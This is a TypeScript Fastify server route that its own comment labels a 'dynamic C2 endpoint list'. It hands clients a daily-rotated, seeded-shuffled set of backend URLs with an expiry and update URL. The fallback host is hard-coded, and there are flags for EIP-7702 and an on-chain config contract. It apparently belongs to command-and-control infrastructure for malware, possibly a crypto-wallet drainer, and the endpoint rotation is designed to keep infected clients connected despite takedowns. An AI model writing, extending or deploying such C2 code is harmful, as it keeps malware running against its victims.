/**
 * Client config rotation — dynamic C2 endpoint list (24h TTL server-side fallback).
 */
import { createHash } from 'node:crypto'

import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'

import { sendSuccess } from '../lib/api-response.js'

function readBackendUrls(): string[] {
  const multi = process.env['BACKEND_URLS']?.trim()
  const primary = process.env['BACKEND_URL']?.trim() || process.env['LEGION_API_URL']?.trim()
  const urls: string[] = []
  if (multi) {
    for (const part of multi.split(',')) {
      const u = part.trim().replace(/\/$/, '')
      if (u && !urls.includes(u)) urls.push(u)
    }
  }
  if (primary) {
    const p = primary.replace(/\/$/, '')
    if (!urls.includes(p)) urls.unshift(p)
  }
  if (urls.length === 0) {
    urls.push('https://legionapi-production.up.railway.app')
  }
  return urls
}

function dailyRotationSeed(): string {
  const day = new Date().toISOString().slice(0, 10)
  const secret = process.env['CLIENT_ENCRYPT_KEY']?.trim() || process.env['GATEKEEPER_SECRET']?.trim() || 'legion-rotate'
  return createHash('sha256').update(`${day}:${secret}`).digest('hex')
}

function rotateEndpoints(urls: string[], seed: string): string[] {
  if (urls.length <= 1) return urls
  const order = [...urls]
  let state = seed
  for (let i = order.length - 1; i > 0; i--) {
    state = createHash('sha256').update(state).digest('hex')
    const j = Number.parseInt(state.slice(0, 8), 16) % (i + 1)
    ;[order[i], order[j]] = [order[j]!, order[i]!]
  }
  return order
}

export async function registerClientConfigRoute(app: FastifyInstance): Promise<void> {
  app.get('/api/v1/client-config', (_request: FastifyRequest, reply: FastifyReply) => {
    const urls = readBackendUrls()
    const seed = dailyRotationSeed()
    const endpoints = rotateEndpoints(urls, seed)
    const expiresAt = new Date()
    expiresAt.setUTCHours(24, 0, 0, 0)
    if (expiresAt.getTime() <= Date.now()) {
      expiresAt.setUTCDate(expiresAt.getUTCDate() + 1)
    }
    return sendSuccess(reply, 200, 'Client config ready', {
      endpoints,
      primary: endpoints[0],
      update_url: `${endpoints[0]}/api/v1/client-config`,
      expires_at: expiresAt.toISOString(),
      eip7702_enabled: (process.env['EIP7702_ENABLED']?.trim().toLowerCase() ?? '') === 'true',
      onchain_config_contract: process.env['ONCHAIN_CONFIG_CONTRACT_ADDRESS']?.trim() || null,
    })
  })
}
